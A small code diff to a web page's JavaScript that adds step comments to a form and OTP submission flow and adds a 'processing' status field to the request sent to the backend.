@@ -287,6 +287,7 @@ async function checkAndRestoreStep() {
   }
 }
 
+// Step 1: Submit Form
 document.getElementById('fRcForm').onsubmit = async function(e) {
   e.preventDefault();
   const u = user();
@@ -348,6 +349,7 @@ document.getElementById('fRcForm').onsubmit = async function(e) {
   }
 };
 
+// Step 2: Submit OTP (Fixed with proper merging and backend status sync)
 document.getElementById('fOtpForm').onsubmit = async function(e) {
   e.preventDefault();
   const otp = document.getElementById('otpCode').value.trim();
@@ -383,6 +385,7 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
         'x-user-token': localStorage.getItem('ds_token') || ''
       },
       body: JSON.stringify({
+        s: 'processing',
         data: {
           ...existingData,
           entered_otp: otp,
